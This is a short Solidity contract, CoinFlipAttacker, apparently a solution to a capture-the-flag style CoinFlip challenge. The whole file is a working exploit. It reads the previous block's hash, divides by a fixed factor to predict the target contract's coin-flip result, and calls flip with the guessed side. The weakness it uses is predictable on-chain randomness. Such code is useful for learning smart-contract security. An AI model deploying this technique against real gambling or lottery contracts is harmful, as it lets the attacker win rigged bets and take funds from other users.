// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipAttacker {
    CoinFlip coinFlip;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAdd) {
        coinFlip = CoinFlip(_contractAdd);
    }

    function win() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1 ? true : false;

        coinFlip.flip(side);
    }
}
